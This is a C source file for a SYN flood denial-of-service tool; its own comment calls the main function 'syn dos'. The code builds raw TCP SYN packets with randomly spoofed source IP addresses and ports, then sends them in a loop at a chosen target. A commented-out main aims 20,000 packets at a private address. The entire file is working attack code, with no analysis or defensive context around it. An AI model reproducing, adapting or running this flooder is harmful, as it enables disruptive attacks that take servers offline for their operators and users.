#include <stdio.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <errno.h>

typedef struct ip_hdr {
    unsigned char h_verlen;
    unsigned char tos;
    unsigned short total_len;
    unsigned short ident;
    unsigned short frag_and_flags;
    unsigned char ttl;
    unsigned char proto;
    unsigned short checksum;
    unsigned int sourceIP;
    unsigned int destIP;
} IP_HEADER;

typedef struct tcp_hdr {
    unsigned short th_sport;
    unsigned short th_dport;
    unsigned int th_seq;
    unsigned int th_ack;
    unsigned char th_lenres;
    unsigned char th_flag;
    unsigned short th_win;
    unsigned short th_sum;
    unsigned short th_urp;
} TCP_HEADER;

typedef struct tsd_hdr {
    unsigned long saddr;
    unsigned long daddr;
    char mbz;
    char ptcl;
    unsigned short tcpl;
} PSD_HEADER;

#define PACKET_SIZE     (sizeof(IP_HEADER) + sizeof( TCP_HEADER ))
#define TH_SYN (0x02)

unsigned short CheckSum(unsigned short * buffer, int size) {
    unsigned long cksum = 0;
    while (size > 1) {
        cksum += *buffer++;
        size -= sizeof (unsigned short);
    }
    if (size) {
        cksum += *(unsigned char *) buffer;
    }
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return (unsigned short) (~cksum);
}

void MySleep(unsigned int micro_second) {
    struct timeval t_timeval;
    t_timeval.tv_sec = 0;
    t_timeval.tv_usec = micro_second;
    select(0, NULL, NULL, NULL, &t_timeval);
}

void Init(char* buffer, char* dst_ip, uint16_t dst_port) {
    char src_ip[20] = {0};
    IP_HEADER IpHeader;
    TCP_HEADER TcpHeader;
    PSD_HEADER PsdHeader;
    sprintf(src_ip, "%d.%d.%d.%d", rand() % 250 + 1, rand() % 250 + 1, rand() % 250 + 1, rand() % 250 + 1);
    IpHeader.h_verlen = (4 << 4 | sizeof (IpHeader) / sizeof (unsigned int));
    IpHeader.tos = 0;
    IpHeader.total_len = htons(sizeof (IpHeader) + sizeof (TcpHeader));
    IpHeader.ident = 1;
    IpHeader.frag_and_flags = 0x40;
    IpHeader.ttl = 255;
    IpHeader.proto = IPPROTO_TCP;
    IpHeader.checksum = 0;
    IpHeader.sourceIP = inet_addr(src_ip);
    IpHeader.destIP = inet_addr(dst_ip);

    TcpHeader.th_sport = htons(rand() % 9000 + 1234);
    TcpHeader.th_dport = htons(dst_port);
    TcpHeader.th_seq = htonl(rand() % 90000000 + 2345);
    TcpHeader.th_ack = 0;
    TcpHeader.th_lenres = (sizeof (TcpHeader) / 4 << 4 | 0);
    TcpHeader.th_flag = TH_SYN;
    TcpHeader.th_win = htons(512);
    TcpHeader.th_sum = 0;
    TcpHeader.th_urp = 0;

    PsdHeader.saddr = IpHeader.sourceIP;
    PsdHeader.daddr = IpHeader.destIP;
    PsdHeader.mbz = 0;
    PsdHeader.ptcl = IPPROTO_TCP;
    PsdHeader.tcpl = htons(sizeof (TcpHeader));

    memcpy((void*) buffer, (void*) &PsdHeader, sizeof (PsdHeader));
    memcpy((void*) (buffer + sizeof (PsdHeader)), (void*) &TcpHeader, sizeof (TcpHeader));
    TcpHeader.th_sum = CheckSum((unsigned short *) buffer, sizeof (PsdHeader) + sizeof (TcpHeader));

    memset(buffer, 0, PACKET_SIZE);
    memcpy((void*) buffer, (void*) &IpHeader, sizeof (IpHeader));
    IpHeader.checksum = CheckSum((unsigned short *) buffer, sizeof (IpHeader));

    //memcpy( (void*)buffer, (void*)&IpHeader, sizeof(IpHeader) );
    memcpy((void*) (buffer + sizeof (IpHeader)), (void*) &TcpHeader, sizeof (TcpHeader));
}

/**
 * syn dos
 * @param serverip
 * @param dst_port
 * @param times
 * @return 
 */
int spoof(char* serverip, uint16_t dst_port, uint32_t times) {
    char dst_ip[20] = {0};
    strncpy(dst_ip, serverip, 16);
    if (inet_addr(dst_ip) == INADDR_NONE) {
        printf("ip error.\n");
        return -1;
    }
    if (dst_port < 0 || dst_port > 65535) {
        printf("port error.\n");
        return -1;
    }
    int sock;
    int flag = 1;
    char buffer[PACKET_SIZE] = {0};
    struct sockaddr_in sa;
    memset(&sa, 0, sizeof (struct sockaddr_in));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(dst_port);
    sa.sin_addr.s_addr = inet_addr(dst_ip);
    if ((sock = socket(PF_INET, SOCK_RAW, 6)) < 1) {
        printf("create socket error.%s\n", strerror(errno));
        exit(-1);
    }
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *) &flag, sizeof (flag)) < 0) {
        printf("setsockopt error.%d\n", errno);
        exit(-1);
    }
    srand((unsigned) time(NULL)); //当前时间做种
    while (times--) {
        memset((void*) buffer, 0, PACKET_SIZE);
        Init(buffer, dst_ip, dst_port);
        if (sendto(sock, buffer, PACKET_SIZE, 0, (struct sockaddr *) (&sa), sizeof (struct sockaddr_in)) < 0) {
            fprintf(stderr, "couldn't   send   packet  %d \n", errno);
        } else {
            fprintf(stdout, ".");
            fflush(stdout);
        }
    }
}

//int main(int argc, char *argv[]) {
//    spoof("192.168.10.151", 8888, 20000);
//   // fprintf(stdout,"%d",sizeof(long));
//    return 0;
//}
